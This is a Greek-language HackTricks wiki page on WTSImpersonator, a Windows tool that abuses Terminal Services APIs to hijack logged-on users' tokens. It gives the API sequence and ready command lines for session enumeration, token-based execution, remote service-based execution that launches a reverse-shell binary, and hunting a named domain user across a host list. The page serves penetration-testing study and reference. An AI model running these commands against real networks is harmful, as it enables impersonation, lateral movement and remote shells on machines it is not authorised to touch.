# WTS Impersonator

{{#include ../../banners/hacktricks-training.md}}

Το **WTSImpersonator**, από τον Omri Baso, χρησιμοποιεί τα Windows Terminal Services APIs που εκτίθενται μέσω του RPC named pipe `\\pipe\LSM_API_service` για την απαρίθμηση των συνδεδεμένων sessions και την εκκίνηση μιας διεργασίας με το token ενός επιλεγμένου χρήστη. Υποστηρίζει local enumeration και execution, καθώς και remote workflows που βασίζονται σε service.<sup>[[1]](#references)</sup>

## Βασική λειτουργικότητα

Το local execution flow του χρησιμοποιεί την ακόλουθη ακολουθία API:<sup>[[1]](#references)[[2]](#references)</sup>
```text
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
## Ενότητες και χρήση

- **Enumerate users:** Το tool μπορεί να απαριθμήσει sessions στον τοπικό ή σε έναν remote host.

- Τοπικά:
```bash
.\WTSImpersonator.exe -m enum
```
- Απομακρυσμένα, καθορίστε μια IP address ή ένα hostname:
```bash
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Execute commands:** Τα modules `exec` και `exec-remote` απαιτούν service context. Η Microsoft τεκμηριώνει ότι το `WTSQueryUserToken` απαιτεί ο caller να εκτελείται ως `LocalSystem` με το privilege `SE_TCB_NAME`.<sup>[[2]](#references)</sup>

- Τοπική εκτέλεση εντολών:
```bash
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- Το PsExec μπορεί να εκκινήσει ένα command prompt ως `LocalSystem` για testing:
```bash
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Remote command execution:** Το remote mode δημιουργεί ένα service στο target μέσω workflow παρόμοιου με του PsExec και επομένως απαιτεί δικαιώματα για την εγκατάσταση και την εκκίνησή του.<sup>[[1]](#references)</sup>

- Παράδειγμα:
```bash
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **User hunting:** Το module `user-hunter` αναζητά σε μια λίστα hosts το session ενός συγκεκριμένου user και προσπαθεί να εκτελέσει το παρεχόμενο πρόγραμμα σε αυτό το context.<sup>[[1]](#references)</sup>
- Παράδειγμα χρήσης:
```bash
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

## References

- [1] [OmriBaso/WTSImpersonator](https://github.com/OmriBaso/WTSImpersonator)
- [2] [Microsoft: συνάρτηση `WTSQueryUserToken`](https://learn.microsoft.com/en-us/windows/win32/api/wtsapi32/nf-wtsapi32-wtsqueryusertoken)
{{#include ../../banners/hacktricks-training.md}}
